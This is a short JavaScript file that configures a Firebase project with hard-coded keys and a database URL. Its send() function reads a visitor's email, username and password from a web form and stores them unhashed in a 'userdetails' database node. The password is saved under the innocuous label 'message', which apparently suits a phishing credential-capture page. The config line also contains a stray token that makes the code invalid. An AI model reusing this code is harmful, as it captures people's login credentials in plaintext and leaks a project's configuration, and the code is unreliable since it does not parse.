
//Cristian's API Key
const firebaseConfig = {
    apiKey: "AIzaSyDRQvRLYymMSigvVJUB4wUwR8ZUy1v8lHk", 'Cristian' 
    authDomain: "login-edb56.firebaseapp.com",
    projectId: "login-edb56",
    databaseURL: "https://login-edb56-default-rtdb.firebaseio.com/",
    storageBucket: "login-edb56.appspot.com",
    messagingSenderId: "677404444347",
    appId: "1:677404444347:web:973f087ee7133642ea8b9e"
  };
  
  const app = firebase.initializeApp(firebaseConfig); 
  const dbRef = firebase.database().ref(); 
   
  const detailsRef = dbRef.child('userdetails'); 
  detailsRef.on("child_added", function(snapshot, prevChildKey) { 
    var newPost = snapshot.val(); 
  }); 
  function send(){ 
    var email = document.getElementById("name").value; 
    var username = document.getElementById("username").value; 
    var password = document.getElementById("message").value; 
    
    detailsRef.push().set({ 
      name: email, 
      username: username, 
      message: password, 
    }); 
   
  } 